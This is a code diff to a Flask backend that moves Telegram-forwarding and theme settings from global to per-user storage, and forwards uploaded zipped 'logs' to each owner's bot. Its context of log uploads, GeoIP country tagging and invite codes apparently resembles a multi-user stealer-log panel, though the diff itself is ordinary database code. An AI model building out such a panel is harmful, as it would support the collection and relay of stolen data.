@@ -131,6 +131,14 @@ def init_db():
             )
         ''')
         db.execute('''
+            CREATE TABLE IF NOT EXISTS user_settings (
+                user_id INTEGER NOT NULL,
+                key TEXT NOT NULL,
+                value TEXT,
+                PRIMARY KEY (user_id, key)
+            )
+        ''')
+        db.execute('''
             CREATE TABLE IF NOT EXISTS invites (
                 code TEXT PRIMARY KEY,
                 created_by INTEGER,
@@ -256,14 +264,20 @@ def get_country_code(ip):
         print(f"[GeoIP] Error: {e}")
     return ''
 
-def forward_to_telegram(zip_path, filename, info):
+def forward_to_telegram(zip_path, filename, info, owner_id=None):
     try:
         with get_db() as db:
-            enabled = db.execute('SELECT value FROM settings WHERE key = ?', ('tg_forward_enabled',)).fetchone()
+            def get_us(key):
+                if owner_id:
+                    r = db.execute('SELECT value FROM user_settings WHERE user_id = ? AND key = ?', (owner_id, key)).fetchone()
+                    if r:
+                        return r
+                return db.execute('SELECT value FROM settings WHERE key = ?', (key,)).fetchone()
+            enabled = get_us('tg_forward_enabled')
             if not enabled or enabled['value'] != 'true':
                 return
-            token = db.execute('SELECT value FROM settings WHERE key = ?', ('tg_bot_token',)).fetchone()
-            chat_id = db.execute('SELECT value FROM settings WHERE key = ?', ('tg_chat_id',)).fetchone()
+            token = get_us('tg_bot_token')
+            chat_id = get_us('tg_chat_id')
 
         if not token or not token['value'] or not chat_id or not chat_id['value']:
             return
@@ -615,7 +629,7 @@ def upload_log():
                 log_id = cursor.lastrowid
             db.commit()
 
-        forward_to_telegram(zip_path, filename, info)
+        forward_to_telegram(zip_path, filename, info, owner_id=owner_id)
         return jsonify({'success': True, 'id': log_id})
     except Exception as e:
         print(f"[API] Upload Error: {e}")
@@ -837,13 +851,20 @@ def delete_log(log_id):
 
 # ===== SETTINGS =====
 
+SETTINGS_DEFAULTS = {
+    'tg_forward_enabled': 'false', 'tg_bot_token': '', 'tg_chat_id': '',
+    'active_bg_theme': 'theme-default', 'bg_blur_value': '15', 'custom_bg_path': ''
+}
+
 @app.route('/api/settings')
 @login_required
 def get_settings():
     try:
+        uid = request.current_user['id']
         with get_db() as db:
-            rows = db.execute('SELECT * FROM settings').fetchall()
-        settings = {r['key']: r['value'] for r in rows}
+            rows = db.execute('SELECT key, value FROM user_settings WHERE user_id = ?', (uid,)).fetchall()
+        settings = dict(SETTINGS_DEFAULTS)
+        settings.update({r['key']: r['value'] for r in rows})
         return jsonify(settings)
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -852,11 +873,12 @@ def get_settings():
 @login_required
 def save_settings():
     try:
+        uid = request.current_user['id']
         data = request.json
         with get_db() as db:
-            for key in ['tg_forward_enabled', 'tg_bot_token', 'tg_chat_id', 'active_bg_theme', 'bg_blur_value', 'custom_bg_path']:
+            for key in SETTINGS_DEFAULTS:
                 if key in data:
-                    db.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, str(data[key])))
+                    db.execute('INSERT OR REPLACE INTO user_settings (user_id, key, value) VALUES (?, ?, ?)', (uid, key, str(data[key])))
             db.commit()
         return jsonify({'success': True})
     except Exception as e:
@@ -866,6 +888,7 @@ def save_settings():
 @login_required
 def upload_background():
     try:
+        uid = request.current_user['id']
         if 'background' not in request.files:
             return jsonify({'error': 'No file uploaded'}), 400
         file = request.files['background']
@@ -876,14 +899,14 @@ def upload_background():
         ext = os.path.splitext(secure_filename(file.filename))[1].lower() or '.jpg'
         if ext not in ALLOWED_BG_EXTS:
             return jsonify({'error': 'Invalid file type. Allowed: jpg, png, gif, webp'}), 400
-        bg_filename = f"custom_bg_{int(time.time())}{ext}"
+        bg_filename = f"custom_bg_{uid}_{int(time.time())}{ext}"
         bg_path = os.path.join(UPLOADS_DIR, bg_filename)
         file.save(bg_path)
         db_path_url = f"/uploads/{bg_filename}"
 
         with get_db() as db:
-            db.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('custom_bg_path', db_path_url))
-            db.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('active_bg_theme', 'theme-custom'))
+            db.execute('INSERT OR REPLACE INTO user_settings (user_id, key, value) VALUES (?, ?, ?)', (uid, 'custom_bg_path', db_path_url))
+            db.execute('INSERT OR REPLACE INTO user_settings (user_id, key, value) VALUES (?, ?, ?)', (uid, 'active_bg_theme', 'theme-custom'))
             db.commit()
 
         return jsonify({'success': True, 'custom_bg_path': db_path_url})
